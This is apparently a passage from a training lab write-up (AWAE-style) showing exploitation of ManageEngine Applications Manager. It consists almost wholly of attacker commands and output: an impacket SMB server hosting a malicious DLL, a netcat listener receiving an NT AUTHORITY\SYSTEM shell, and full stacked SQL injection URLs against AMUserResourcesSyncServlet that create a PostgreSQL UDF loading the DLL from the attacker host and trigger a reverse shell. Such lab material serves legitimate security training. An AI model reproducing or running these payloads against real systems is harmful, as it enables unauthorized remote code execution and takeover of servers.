## Exploitation
### Spawn a Samba share server on your Kali attacking machine hosting the malicious DLL file (`rev_shell.dll`)
```
┌──(kali㉿kali)-[~]
└─$ sudo impacket-smbserver awae /home/kali/awae/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.130.113,63054)
[*] AUTHENTICATE_MESSAGE (\,MANAGEENGINE)
[*] User MANAGEENGINE\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] Handle: The NETBIOS connection with the remote host timed out.
[*] Closing down connection (192.168.130.113,63054)
[*] Remaining connections []

```
### Setup your Netcat listener
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.233] from (UNKNOWN) [192.168.130.113] 64758
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb>whoami
whoami
nt authority\system

C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb>

```
### Run the exploitation script (`udf_revshell.py`)
```
┌──(kali㉿kali)-[~]
└─$ python3 udf_revshell.py manageengine:8443 192.168.45.233 4444
[+] Creating UDF function for reverse shell...
[+] [*] Final SQL for UDF creation: CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\192.168.45.233\awae\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT
[+] [*] Executing query (truncated): CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\192.168....
[+] [>] Full URL: https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\192.168.45.233\awae\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT;--
[+] Triggering reverse shell...
[+] [*] Final SQL for shell trigger: SELECT rev_shell($$192.168.45.233$$, 4444)
[+] [*] Executing query (truncated): SELECT rev_shell($$192.168.45.233$$, 4444)...
[+] [>] Full URL: https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT rev_shell($$192.168.45.233$$, 4444);--
                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```
